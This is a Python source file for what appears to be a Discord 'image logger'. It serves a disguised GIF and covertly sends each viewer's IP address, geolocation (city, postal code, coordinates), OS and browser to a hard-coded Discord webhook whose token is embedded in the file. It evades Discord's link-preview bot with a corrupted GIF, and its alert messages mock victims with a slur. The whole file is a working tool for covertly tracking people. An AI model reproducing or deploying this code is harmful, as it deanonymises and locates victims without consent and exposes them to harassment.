from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import httpagentparser

webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'

clean_image_url = 'https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1'

# Tiny corrupted GIF - Discord shows endless loading spinner
bugged_gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [{
            "title": "DADDY BOB STRIKES AGAIN!",
            "color": 16711803,
            "description": "A New Retard Opened The \"Gif\" LOL.",
            "author": {"name": "Fentanyl"},
            "fields": [
                {"name": "IP Info", "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}", "inline": True},
                {"name": "Advanced Info", "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}", "inline": False}
            ]
        }]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [{
            "title": "Fentanyl Alert!",
            "color": 16711803,
            "description": f"Discord preview hit—real open coming soon?\n**Proxy IP:** `{ip}`\n**UserAgent:** `{uag}`",
            "author": {"name": "Fentanyl"}
        }]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'

            useragent = self.headers.get('user-agent', 'No User Agent Found!')

            os, browser = httpagentparser.simple_detect(useragent)

            # Exact match from your logs + IP backups
            is_discord = (
                'Discordbot/2.0' in useragent or
                ip.startswith(('35.', '104.196.', '104.244.', '162.'))
            )

            params = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            image_url = params.get('url', clean_image_url)

            try:
                clean_data = httpx.get(image_url, timeout=15).content
            except:
                clean_data = b''

            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()

            if is_discord:
                self.wfile.write(bugged_gif)
                httpx.post(webhook, json=prev(ip, useragent))
            else:
                self.wfile.write(clean_data if clean_data else bugged_gif)
                try:
                    ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=15).json()
                    payload = formatHook(
                        ipInfo.get('ip', ip),
                        ipInfo.get('city', 'Unknown'),
                        ipInfo.get('region', 'Unknown'),
                        ipInfo.get('country', 'Unknown'),
                        ipInfo.get('loc', 'Unknown'),
                        ipInfo.get('org', 'Unknown'),
                        ipInfo.get('postal', 'Unknown'),
                        useragent, os, browser
                    )
                    httpx.post(webhook, json=payload)
                except:
                    httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))

        except:
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')
                self.end_headers()
                self.wfile.write(bugged_gif)
            except:
                pass

        return
